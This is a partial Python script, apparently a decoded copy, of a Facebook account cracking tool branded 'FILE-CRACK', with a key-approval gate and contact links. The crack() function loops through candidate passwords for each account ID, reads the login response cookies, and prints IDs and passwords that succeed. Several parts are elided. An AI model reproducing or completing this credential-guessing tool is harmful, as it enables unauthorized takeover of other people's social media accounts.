#DECODED BY : Ahameed ALIF
#GITHUB : https://github.com/ITZALIF007
#--------------------------------------------------------------------------#
#
#-----------------[ IMPORT-MODULE ]-------------------

#mport os, platform, time, sys
#print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mi love you _ Bro ')
#time.sleep(3)
#os.system('clear')
#print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mAhameed 🍃🍃🥱")
#time.sleep(3)
...
def banner():
  ...
  \33[1;31m  ___  _   _ ___  ___    ___ ___ _    ___ 
 \33[1;32m   |   \| | | |   \| __|__| __|_ _| |  | __|
    \33[1;34m| |) | |_| | |) | _|___| _| | || |__| _| 
    \33[1;35m|___/ \___/|___/|___|  |_| |___|____|___|

\x1b[38;5;46m______________________________________________________

 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER :   Ahameed ALIF
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m FACEBOOK  :   D9DE.Pro
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   itzalif007
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   FILE-CRACK🥀
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m VERSION   :  \033[1;31m F1 
...
#DUDE_NAME=input(f'\033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m YOUR NAME :\x1b[1;96m ')
#--------------------[ X-DUDE ]--------------#
...
def menu():
	...
	print(f"{W}[{G}2{W}] FILE Create (AKING) ")
	print(f"{W}[{G}3{W}] Random Cloning ")
	print(f"{W}[{G}4{W}] Contact  (Admin) ")
...
def JK9():
     os.system("xdg-open https://t.me/Ahameed07")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [DUDE] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[DUDE-ALIF-OK💉] '+idf+ ' | '+pw+'')
...
def shoha_menu():
    ...
    id = "_".join(uuid)
    print(banner)
    xnxx=requests.get("https://github.com/cyber-xbot/Tutul/blob/main/Op.txt").text
    if id in xnxx:
        menu()
    else:
  #      os.system("clear")
   ...
   #     time.sleep(3.0)
        ...
        print ("\33[;33m\n              ✨✨    : :  :: ::  :  :   : :  :   \33[;33m \n             ✨ ██████╗  █████╗ ██████╗ ███████╗\n             ✨ ██╔══██╗██╔══██╗██╔══██╗██╔════╝\n             ✨ ██║  ██║╚██████║██║  ██║█████╗  \n             ✨ ██║  ██║ ╚═══██║██║  ██║██╔══╝  \n             ✨ ██████╔╝ █████╔╝██████╔╝███████╗\n             ✨ ╚═════╝  ╚════╝ ╚═════╝ ╚══════╝\x1b[31m𝚟.F1\33[;33m \n              ✨✨  :    :: ::  :: ::  ::   : :: ::\n              ")
        print ("")
        print("\033[31;1m\n              🍪  First Get \033[91;1mApprovel")
        print("             ✨ Your Key is Not Approved ")
        print("             🌿 Copy And Send Key To Admin")
        print ("")
        print("\x1b[1;90m\nJoin Now -\x1b[1;90m \nhttps://m.me/j/AbYkpV35yDD_9xa7/")
        print ("")
        print ("\033[93;1mYour Key :   \033[96;1m"+id+UMO)
        print ("")
        name = input("\033[93;1mYour Name:   \033[36;1m")
        print ("\x1b[1;96m\nWe currently can't verify your Key 🗝️. \nPlease try again later.")
        time.sleep(3)
        input(" \x1b[1;90m\nPress Enter To Send Key🗝️")
        os.system("xdg-open https://m.me/j/AbYkpV35yDD_9xa7/")
        shoha_menu()   
shoha_menu()
